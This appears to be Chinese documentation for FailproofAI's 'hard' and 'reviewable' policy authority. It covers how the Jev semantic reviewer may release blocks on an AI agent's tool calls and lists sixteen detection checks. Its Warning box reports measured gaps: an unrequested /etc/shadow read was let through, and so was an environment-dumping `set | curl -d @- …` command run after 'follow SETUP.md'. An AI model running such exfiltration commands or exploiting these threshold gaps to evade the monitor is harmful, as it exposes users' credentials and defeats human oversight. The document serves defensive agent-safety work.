当你通过 FailproofAI Cloud 或自己的密钥配置 [Jev 策略审查](/zh/policies/jev) 时，每个受门控的工具调用都会经过你所运行的策略以及 Jev 的判断——Jev 会询问该调用实际执行了什么，以及发起任务的用户是否明确要求了这一操作。每个策略的**权限**决定了两者产生分歧时的处理方式。

未配置 Jev 时，权限设置不起任何作用。每个策略将按原有方式严格执行。

## 硬性与可审查

- **硬性（Hard）** 是默认设置。硬性策略的拒绝或指令是最终决定：Jev 无法放行，硬性拒绝会立即阻止调用，无需等待 Jev。
- **可审查（Reviewable）** 意味着 Jev 可以放行策略的判决，但仅限于策略在 `reviewedBy` 中指定的语义检查项。只有当**所有**指定检查项均已针对此次调用进行询问，且每项检查要么未发现问题、要么记录了用户明确请求，判决才会被放行。某项检查**触发**（发现问题）但用户未提出请求时，即使该检查本身的判决仅为警告，拦截依然维持。由于某检查项不适用于该工具而未被询问时，无论其他检查结果如何，该检查项永远不会触发放行。满足以下任一条件即视为用户同意：当该调用是用户所下达任务的一个步骤且未超出任务范围时，Jev 将拒绝转为警告，该警告会放行策略的拦截，并将其作为通知传递给智能体。

只有同时满足以下所有条件，策略才是可审查的：

1. 声明了 `authority: "reviewable"`。
2. `reviewedBy` 是一个非空列表，且每个条目都是已安装策略包所声明的 Jev 检查项。Failproof AI 本身不附带任何 Jev 检查项：[下方十六项](#semantic-policy-names)来自 `failproofai policies add FailproofAI/jev-policies`。若没有任何策略包声明检查项，则所有策略均为硬性。
3. 未设置 `alwaysOn`。阻止智能体禁用 Failproof AI 的防护措施始终为硬性。

其他情况均为硬性：缺失字段、拼写错误的值、空的或格式错误的 `reviewedBy`，或名称不对应当前机器可询问的检查项。未知名称会使整个声明变为硬性，而非被跳过——因为 `reviewedBy` 的含义是"所有这些项都必须被询问，且均不得拒绝"，跳过某个名称会导致 Jev 在比你要求更少的检查项上放行策略。

Jev 配置完成后，Failproof AI 在拒绝 `reviewable` 声明时会记录一条警告，每个进程只记录一次。未配置 Jev 时不会输出任何信息，因为此时权限设置不决定任何事项。`failproofai publish` 拒绝构建携带此类声明的策略包，让策略包作者在任何人安装之前就能发现问题。它会将 `reviewedBy` 与策略包声明的检查项进行核验——如果策略包本身声明了检查项则使用这些检查项，否则使用 `FailproofAI/jev-policies` 的十六个名称。

## 权限声明位置

每种策略到达机器的方式都有一个对应的权限声明位置：

| 来源 | 声明位置 | 默认值 |
| --- | --- | --- |
| 内置策略 | 下方表格 | 除列出为可审查外，均为硬性 |
| 自定义策略文件 | `customPolicies.add` 上的 `authority` 和 `reviewedBy` | 硬性 |
| 策略包 | 策略包清单（`failproofai-pack.json`）中各策略的条目 | 硬性 |
| 云托管策略 | 活跃部署中策略的分配设置 | 硬性。部署尚未设置此项，因此当前所有云托管策略均为硬性。 |

对于策略包或云托管策略，策略代码内部设置的字段会被忽略；清单或分配设置才是决定因素。策略包只能描述自己的策略：其策略名称不能包含 `/`，且注册在策略包自己的命名空间下，因此任何清单都无法将内置策略或其他策略包的策略标记为可审查。策略包代码注册但未在清单中声明的策略为硬性。

两个策略包或两个云托管策略，如果其代码字节完全相同，则共享同一个构件并作为一个策略加载。该策略只有当它们全部声明为可审查时才是可审查的，且 Jev 必须放行它们中任何一个所命名的全部检查项。如果其中任何一个声明为硬性，或根本未声明，则保持硬性。策略包或策略的列出顺序不影响结果。

大多数机器从 `FailproofAI/policies` 策略包获取内置策略，并从该包的清单中读取权限设置。下方列出的可审查条目在携带它们的策略包版本安装后生效；较旧的版本不包含任何可审查条目，因此其中所有策略均保持硬性。

## 在自定义策略中声明权限

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` 会将这两个字段复制到策略包清单中，因此以策略包形式发布的策略会保留作者所赋予的权限设置。如果声明无法被执行，则拒绝构建策略包：值不是 `"hard"` 或 `"reviewable"`、`reviewedBy` 不是名称列表，或名称不是检查项——若策略包本身声明了检查项则使用 [Jev 检查项](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，否则使用内置检查项。

## 内置策略

仅在语义策略真正覆盖相同关切事项时才设为可审查。所有其他内置策略均为硬性。

覆盖关切事项是必要条件但非充分条件，且两种错误方式都是静默的：

- **从未被询问的检查项**会使拦截永久化。`reviewedBy` 是一个合取关系，从未被询问的检查项永远不会触发放行——因此，与某个前置条件对策略匹配的形状从不触发的检查项配对的策略，永远无法被放行。
- **被询问但未触发的检查项**回答"无关切"，而"无关切"会触发放行。因此，与不能建模你策略形状的检查项配对，并不是在审查策略——而是对于检查项无法理解的输入，恰好将策略关闭。

指令模式的语义策略永远不能回答拒绝，但它仍然可以维持拦截：当它触发且用户未请求该调用时，它所审查的策略不会被放行。`FailproofAI/jev-policies` 检查项中有六项仅为指令模式——`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump` 和 `external-data-egress`——[下方表格](#semantic-policy-names)列出了每个检查项的模式。需要思考的问题是：**"是否还有任何能够拒绝的机制"**：放行永远不能让关切事项处于无任何强制措施的状态。引擎对每次调用应用此测试。未经用户同意的警告不算放行，因为在工具调用之前，警告不会阻止智能体。当一个*能够*拒绝的检查项发出警告时——其证据未达到拒绝阈值——且用户未请求该调用，该调用上没有任何内容被放行，所有正则表达式拒绝依然有效。

<Warning>
**恰好低于触发阈值的检查项不能维持底线。** 上述规则需要检查项*触发*（证据 ≥ 0.7）。当所有相关检查项均略低于该值时，没有任何检查项触发，审查者回答"无关切"，可审查的拒绝会被放行。在强制模式下的实测结果：未经请求地读取 `/etc/shadow`（`secret-exposure` 0.69，`read-outside-workspace` 0.37，后者仅对家目录路径建模）和在"follow SETUP.md"之后执行 `set | curl -d @- …`（`env-secrets-dump` 0.66，`credential-exfiltration` 0.65，`sends_out` 0.97）均被放行，而单独依靠正则表达式层则会拒绝它们。这些阈值是在标注语料库上校准的，尚未针对此情况重新测量；在重新测量之前，对于上述任何形状通过所产生的影响大于其误报拦截的策略，请保持**硬性**。
</Warning>

## 语义策略名称

这些是 `FailproofAI/jev-policies` 声明的检查项，也是安装后 `reviewedBy` 所接受的值。Failproof AI 本身不附带任何检查项：没有该策略包（或其他声明这些名称的策略包）时，命名这些检查项的策略均不可审查。每项检查都是 Jev 针对当前工具调用所回答的问题。**模式**是检查项能给出的答案：`deny` 检查项在证据充分时会拦截，而 `instruct` 检查项只会发出警告。两种模式下，当检查项触发且用户未请求该调用时，均会维持策略的拒绝。**用户可覆盖**表示用户的明确请求是否能放行该检查项。

Jev 只询问已安装策略包声明的 [Jev 检查项](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，这些也是 `reviewedBy` 所接受的名称。如果两个策略包以不同方式声明同一名称，则对两者均不生效。这十六个名称中，由非 FailproofAI 仓库安装的策略包所声明的名称，在该包中会被忽略：其版本永远不会被询问，也不会与 FailproofAI 自己的版本产生竞争，因此第三方策略包既不能成为放行核心包策略的检查项，也不能关闭这些检查项中的任何一个。无法读取的策略包列表，或所有检查项均不可用的策略包，会导致 Jev 无从询问。

| 名称 | 模式 | 用户可覆盖 | Jev 检查的内容 |
| --- | --- | --- | --- |
| `destructive-deletion` | deny | 是 | 永久删除无法再生的数据。 |
| `production-infra-change` | deny | 是 | 更改生产基础设施。 |
| `git-history-rewrite` | deny | 是 | 重写或丢弃共享的 git 历史记录。 |
| `push-to-protected-branch` | instruct | 是 | 直接推送到受保护分支。 |
| `commit-on-protected-branch` | instruct | 是 | 直接在受保护分支上提交。 |
| `secret-exposure` | deny | 是 | 读取或复制凭据。 |
| `credential-exfiltration` | deny | 否 | 将密钥或私有文件发送到机器外部。 |
| `remote-code-execution` | deny | 是 | 运行从互联网下载的代码。 |
| `privilege-escalation` | deny | 是 | 以提升的权限运行。 |
| `database-destruction` | deny | 是 | 销毁或批量修改数据库数据。 |
| `read-outside-workspace` | instruct | 是 | 读取项目之外的文件。 |
| `agent-config-tampering` | deny | 否 | 更改智能体自身的安全配置。 |
| `system-modification` | instruct | 是 | 在项目之外更改系统。 |
| `env-secrets-dump` | instruct | 是 | 打印环境变量中的密钥。 |
| `external-destructive-action` | deny | 是 | 通过外部工具执行不可逆操作。 |
| `external-data-egress` | instruct | 是 | 将私有数据发送到外部工具。 |
